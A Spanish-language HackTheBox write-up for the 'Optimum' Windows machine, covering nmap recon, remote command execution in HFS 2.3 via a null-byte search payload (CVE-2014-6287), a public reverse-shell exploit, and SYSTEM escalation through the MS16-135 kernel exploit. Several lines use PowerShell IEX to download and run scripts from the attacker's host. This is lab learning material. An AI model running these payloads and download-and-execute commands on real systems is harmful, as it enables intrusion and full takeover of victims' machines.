---
layout      : post
title       : "HackTheBox - Optimum"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6banner.png
category    : [ htb ]
tags        : [ kernel-exploit, PSarchitecture, HFS, MS16-135 ]
---
Máquina Windows nivel fácil. Evitamos los filtros que nos ponga **HTTP File Server**, transformamos (transformers (optimus prime (optimum (nombre bien pensado eh!)))) nuestra arquitectura y explotamos el siempre triste **kernel**.

![6optimumHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6optimumHTB.png)

## TL;DR (Spanish writeup)

**Creada por**: [ch4p](https://www.hackthebox.eu/profile/1) (e l  c r e a d o r).

Vamos a "**transformer**" nuestro destino.

Encontraremos un servidor web con el servicio `HTTP File Server` en su versión `2.3`, jugaremos con eso para entender una vulnerabilidad y ejecutar comandos con ella en el sistema. Obtendremos una **reverse Shell** como el usuario `kostas`.

Nuestra terminal estará limitada a ejecutar procesos de `32 bits`, moveremos fichas para generar una nueva, pero que nos permita ejecutar instrucciones de `64 bits`, **pero ¿para qué?...**

Encontraremos varios caminos para escalar privilegios, usaremos uno que se aprovecha del kernel (`MS16-135`), peeeeeeeeero para su correcta ejecución necesitaremos estar en una arquitectura de `64 bits`. ***E AY LHA RASON!***

...

### Clasificación de la máquina según la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>

Vulns conocidas peeeero le cuesta llegar a ser real :(

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo mostrar lo que hice.

...

Eclipse eterno.

1. [Reconocimiento](#reconocimiento).
  * [Enumeración de puertos con nmap](#enum-nmap).
2. [Enumeración](#enumeracion).
  * [Exploramos el servicio **HFS** sobre el puerto 80](#puerto-80).
3. [Explotación: jugamos con el servicio **HFS**](#explotacion).
  * [Validamos ejecución remota de comandos usando **CVE-2014-6287**](#hfs-cve-2014-6287).
4. [Escalada de privilegios](#escalada-de-privilegios).
  * [Descubrimos la arquitectura real en la que corren nuestros scripts de **PowerShell**](#ps-architecture).
  * [Explotamos el **kernel** y obtenemos sesión como **nt authority\system**](#ms16-135).

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

...

## Enumeración de puertos con nmap [📌](#enum-nmap) {#enum-nmap}

Empezaremos viendo que puertos tiene abiertos externamente la máquina, esto nos sirve para empezar a direccionar nuestra investigación y posterior enumeración. Usaremos `nmap`:

```bash
❱ nmap -p- --open -v 10.10.10.8 -oG initScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que están abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [función **extractPorts**](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

Ese escaneo nos muestra:

```bash
# Nmap 7.80 scan initiated Wed Aug 18 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.8
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.8 ()	Status: Up
Host: 10.10.10.8 ()	Ports: 80/open/tcp//http///	Ignored State: filtered (65534)
# Nmap done at Wed Aug 18 25:25:25 2021 -- 1 IP address (1 host up) scanned in 274.47 seconds
```

| Puerto | Descripción |
| ------ | :---------- |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Nos brinda un servidor web (pagina web). |

Ya que sabemos que solo el puerto `80` esta expuesto, vamos a ver que versión y scripts tienen relación con ese puerto, en este caso al ser un solo puerto no es necesario usar la función `extractPorts` que referenciamos antes, pero en caso de contar con muuuuuchos puertos esta muy bien usarla y no copiar uno a uno cada puerto.

```bash
❱ nmap -p 80 -sC -sV 10.10.10.8 -oN portScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

Y con este escaneo obtenemos:

```bash
# Nmap 7.80 scan initiated Wed Aug 18 25:25:25 2021 as: nmap -p 80 -sC -sV -oN portScan 10.10.10.8
Nmap scan report for 10.10.10.8
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug 18 25:25:25 2021 -- 1 IP address (1 host up) scanned in 20.80 seconds
```

Tenemos algunas cositas relevantes:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 80     | HTTP     | HttpFileServer httpd 2.3 |

* Servicio `Http File Server` en su versión `2.3`.

Por ahora nada más (aunque ya con la versión es bastante e.e). Exploremos el servidor web a ver como romperlo.

...

# Enumeración [#](#enumeracion) {#enumeracion}

...

## Puerto 80 [📌](#puerto-80) {#puerto-80}

Como vimos existe un servicio llamado `Http File Server` montado en el puerto `80`, pues validémoslo y en dado caso conozcamos de que se trata...

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6page80.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Un poco feita la interfaz 😁, pero vemos varias cositas, un link hacia un `login`, una barra de búsqueda (jmm) y de los demás botones el único llamativo es `Get list` en ***Actions***, el cual nos redirecciona a:

```html
http://10.10.10.8/?tpl=list&folders-filter=\&recursive
```

Y quizás podríamos jugar con ella... Veamos de que se trata **HFS**:

🌎 [***`HFS (HTTP File Server)` es un servidor web diseñado para publicar y compartir archivos***](https://www.rejetto.com/hfs/).

Bien, sencillito.

Pues recordemos que tenemos una versión del software, vamos a la web y busquemos cositas relacionadas con esa versión, quizás hay vulnerabilidades conocidas...

...

# Explotación [#](#explotacion) {#explotacion}

Buscando llegamos a este `CVE`:

* [cve.mitre.org - CVE-2014-6287](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6287).

Se trata de una ejecución remota de comandos -gracias- a una pobre sanitización llevada a cabo por expresiones regulares sobre el archivo `ParserLib.pas`. La explotación se logra mediante un [null byte (%00)](https://www.whitehatsec.com/glossary/content/null-byte-injection), ya que bypassea el regex, detiene tooodo lo anterior a él y simplemente ejecuta lo que este después, o sea, nuestros comandos locochones...

⚪⚪⚪ ***`Null bytes` are put in place to terminate strings or be a place holder in code, and injecting these into URLs can cause web applications to not know when to terminate strings and manipulate the applications.*** [whitehatsec](https://www.whitehatsec.com/glossary/content/null-byte-injection).

Uff suena prometedor, investigando un poquito más llegamos es este recurso:

* [Vulnerability analysis of HFS 2.3](https://subscription.packtpub.com/book/networking_and_servers/9781786463166/1/ch01lvl1sec20/vulnerability-analysis-of-hfs-2-3).

**Un análisis de la vuln, esta bien detallado, <span style="color: white;">échenle un ojo.</span>**

---

## Validamos <u>RCE</u> explotando <u>CVE-2014-6287</u> [📌](#hfs-cve-2014-6287) {#hfs-cve-2014-6287}

Leyendo sobre la explotación, todo pasa en el apartado `search` (en nuestra enumeración anterior lo vimos).

Una consulta normal por ejemplo del texto `hola`, redireccionaría a:

```html
http://10.10.10.8/?search=hola
```

Y veríamos esto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6page80_search_holaNORMAL.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Nada anormal...

En el caso de la explotación la consulta sería distinta, ya que se le agrega el `null byte` para bypassear el filtro regex yyyyyy simplemente agregaríamos el comando a ejecutar:

```py
http://10.10.10.8/?search=hola%00{.exec|aca_el_comando_a_ejecutar.}
```

Por ejemplo:

```py
http://10.10.10.8/?search=hola%00{.exec|whoami.}
```

En la respuesta veríamos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6page80_search_holaWITHnullBYTE_execWHOAMI.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Lo único distinto que vemos es un símbolo al lado de `hola`, pero no tenemos el reflejo del comando `whoami` 😔

Como una de las pruebas que debemos hacer seria intentar lanzarnos paquetes `ICMP` con ayuda del comando `ping`, si en nuestra máquina recibimos los paquetes entonces confirmamos que existe la ejecución remota de comandos solo que no se reflejan en la web. Pues pongámonos en escucha por la interfaz [tun0](https://www.reddit.com/r/networking/comments/5mnnjh/explanation_on_tun0_network_device/) (donde se monta la **VPN**, en mi caso solo tengo la de HTB**, la confirman con `ipconfig` o `ip a`) y estemos atentos por si llegan paquetes `ICMP` (que son los que envía el comando `ping`):

```bash
❱ tcpdump -i tun0 icmp
```

Y ahora desde la web lanzamos:

```py
http://10.10.10.8/?search=hola%00{.exec|ping%2010.10.14.2.}
```

Pero no recibimos nada, seguimos probando... Yyyy finalmente llegamos al resultado de este intento:

```py
http://10.10.10.8/?search=hola%00{.exec|powershell.exe -c "ping 10.10.14.2".}
```

Cuando lo ejecutamos en la web no vemos nada reflejado (tampoco debería), peeeeeeeeeeero en nuestro analizador de tráfico:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6bash_tcpdump_ICMPreceived.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Vemos los paquetes enviados por la dirección IP `10.10.10.8` (la máquina víctima) hacia nuestra máquina, así que existe la ejecución remota de comandos (: YYYYYYYYYYYYYy entendimos como funciona la vulnerabilidad.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6google_gif_snoopdogDANCEhappy.gif" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>

...

Ahora que sabemos que los comandos se están ejecutando podemos aprovecharnos de un exploit público el cual [lanza una reverse Shell generada con `PowerShell`](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell), la encodea a **base64** y como comandos que ejecutara el sistema le indica que decodee la cadena y la interprete. No debemos ponernos en escucha, ya que el mismo script lo hace: `nc -nlvp el_puerto_que_le_indiquemos`.

* [HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)](https://www.exploit-db.com/exploits/49584).

Lo descargamos y en su código cambiamos las variables `lhost` por nuestra dirección IP y `lport` por el puerto en el que queremos recibir la Shell. (El exploit fue creado para esta máquina, ya que trae por default que el servidor vulnerable esta sirviendo en la dirección IP `10.10.10.8`)

Y ahora si lo ejecutamos:

```bash
❱ python3 hfsRCE.py
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6bash_scriptPY_kostasRevSH_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

PEEEEEEEEEEEEEEEERFECTIIIIIIIIIIiii11isadifjoasdifjSIMOOOOOOOoo, tenemos una **PowerShell** en el sistema como el usuario `kostas` (:

...

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Después de estar en un laberinto suuuuuuuper largo finalmente conseguimos explotar esta vaina.

Enumerando el sistema vemos que podemos ejecutar `systeminfo`, aprovechemos las muuuuuuchas herramientas que existen para ver si el kernel o la versión del SO tiene alguna vulnerabilidad.

* [Apoyados en esta guía de **PrivEsc** caemos en nuestro siguiente recurso](https://oscp.securable.nl/privilege-escalation).

El que nos muestra unos resultados sencillos y directos es [Sherlock](https://github.com/rasta-mouse/Sherlock) (que ya esta obsoleto, pero sigue funcionando), **Sherlock** es un script de `PowerShell` que busca vulnerabilidades relacionadas con "parches" del sistema.

Entonces, podemos ya sea, descargar el archivo, subirlo e importar su función principal llamada `Find-AllVulns` (si revisas el código la vez) oooooooo simplemente descargarlo, levantar un servidor **web** y desde la consola de **PowerShell** indicarle que cargue un módulo (el contenido) de x URL (nuestro script de `Sherlock.ps1`), hagamos esta última:

* [https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1](https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1).

Levantamos servidor web donde esté el archivo:

```bash
❱ python3 -m http.server
```

Y ahora desde la **PS** indicamos:

```powershell
IEX(New-Object Net.Webclient).downloadString('http://10.10.14.2:8000/Sherlock.ps1')
```

Ya el contenido del script estaría importado como un **módulo** en el sistema, nos quedaría llamarlo:

```powershell
PS C:\\Users\kostas\Videos> Find-AllVulns
```

De los resultados que arroja detallamos estos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6bash_kostasSH_SherlockREPORT.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Existen 3 vulnerabilidades que parecen afectar el sistema, pues empecemos a profundizar a ver...

---

## Descubrimos arquitectura real en la que corren nuestros scripts de <u>PowerShell (PS)</u> [📌](#ps-architecture) {#ps-architecture}

Dejando algunos objetos de lado llegamos al boletín `MS16-135`, la explotación de esa vuln es dada gracias a un problema con el kernel que permite escalar privilegios sin importar que usuario seamos...

Les dejo estos dos recursos para que profundicen:

* [Cómo explotar el bug de MS16-135 en Windows x64 con PowerShell & Metasploit "Like a Boss"](https://www.elladodelmal.com/2017/04/como-explotar-el-bug-de-ms16-135-en.html).
* [Digging Into a Windows Kernel Privilege Escalation Vulnerability: CVE-2016-7255](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/digging-windows-kernel-privilege-escalation-vulnerability-cve-2016-7255/).

Enfocados en ese boletín llegamos a esta prueba de concepto en **PS**:

* [MS16-135.ps1](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-135/MS16-135.ps1).

Haremos lo mismo que con `Sherlock`, descargamos el recurso, levantamos servidor web e importamos su contenido. En este caso no tendremos que llamar ninguna función porque el código no esta en ninguna, por lo que una vez ejecutemos:

```powershell
IEX(New-Object Net.Webclient).downloadString('http://10.10.14.2:8000/MS16-135.ps1')
```

Interpretara el código y lo ejecutara...

El output después de ejecutarlo es confuso:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6bash_kostasSH_MS135error_NOTx64.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Pero si validamos `systeminfo` tenemos:

```powershell
PS C:\> systeminfo
...
System Type:               x64-based PC
...
```

WTF, debería funcionarnos el script, ya que ***SI*** estamos en una arquitectura `x64`... ¿O no?

Pues buscando info para validar esto encontramos este post:

* [4 Ways to Find OS Architecture using PowerShell (32 or 64 bit)](https://ridicurious.com/2018/10/17/4-ways-to-find-os-architecture-using-powershell-32-or-64-bit/).

En la cuarta forma de validarlo quedamos anonadados 😲

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6google_validatingOSarch_IntPtr.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Solo podemos obtener dos respuestas: `4` (4*4=32 (32 bits)) u `8` (8*8=64 (64 bits)). 

Veamos:

```powershell
PS C:\> [System.IntPtr]::Size
4
```

🙆‍♂️ kheeeeeeeeeeeeeeeeeeeeeee!!

**<span style="color: grey;">HOY (un día)</span>**: ***<span style="color: yellow;">No he encontrado él -porque- de esto, seguiré investigando y dejaré un update :P</span>*** <br>
**<span style="color: grey;">UPDATE (3 días después)</span>**: Según ***<span style="color: yellow;">[0xdf en su writeup](https://0xdf.gitlab.io/2021/03/17/htb-optimum.html#shell-as-system): "That is because the HFS process is likely running as a 32-bit process".</span>***

Intentando corroborar lo obtenido llegamos a este hilo en **stackoverflow**:

* [check processor architecture and proceed with if statement](https://stackoverflow.com/questions/25407634/check-processor-architecture-and-proceed-with-if-statement#answer-25407836).

Usando:

```powershell
[System.Environment]::Is64BitProcess
```

Podemos validar si los procesos ejecutados están siendo tomados desde una arquitectura `64 bits`:

```powershell
PS C:\> [System.Environment]::Is64BitProcess
False
```

Y no, confirmamos que no estamos en una arquitectura de `64 bits` sino en una de `32 bits`...

Buscando maneras de cambiarnos a `64 bits` llegamos a este nuevo hilo:

* [How to launch 64-bit powershell from 32-bit cmd.exe?](https://stackoverflow.com/questions/19055924/how-to-launch-64-bit-powershell-from-32-bit-cmd-exe).

---

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6google_stackoverflow_CHANGEarch32to64.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

La que nos permite el cambio es ejecutar `powershell` desde la ruta **nativa**, esto para poder ejecutar código de `64 bits` sobre una arquitectura de `32 bits`.

Pues hagamos la fácil, modifiquemos el script con el que obtuvimos la reverse Shell y en vez de llamar `powershell.exe` sin ruta absoluta, agreguémosle la ruta nativa y validemos si conseguimos estar en `64 bits`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6bash_scriptPYsource_updatePSnative.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Ejecutamos yyyyyyyyyyyyyyyyyyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6bash_kostasSH_PSnative_DONE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

LISTOOOOOOOOOOOOOOOOOOOOOOOONEEEEEEES, ahora sííííííí ...... AHHHHHHHHHHHHHHHHHHHHHHHHHHLKfjsadklfjlñaksdlkjld e.e

---

## Conseguimos <u>Shell</u> como <u>nt authority\system</u> [📌](#ms16-135) {#ms16-135}

Volvamos a ejecutar el contenido del script (ya no deberíamos ver ese error):

```powershell
PS C:\> IEX(New-Object Net.Webclient).downloadString('http://10.10.14.2:8000/MS16-135.ps1'
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6bash_kostasSH_MS135_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

¡DE MARAVILLA!! Ya funciona, pero parece que todo esta igual ¿no? e.e Puesssssssssssssss:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6bash_sysSH_MS135.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Tamos tamos tamoooooooooooooooooooooooooooos, hemos migrado al usuario `nt authority\system` y obtenido una **terminal** como él (: 

Linda manera de escalar, me g u s t o.

Ya podríamos ver las flags:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6flags.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

...

Me gusto bastante la máquina, sobre todo la escalada, no me había topado con ese "problema" de estar en una arquitectura pero a la vez no, loco loco.

Este es el final de nuestro encuentro, pero nos leeremos con más cositas, bendiciones, besitos y como siempre, a seguir rompiendo tooooooooooooodo!!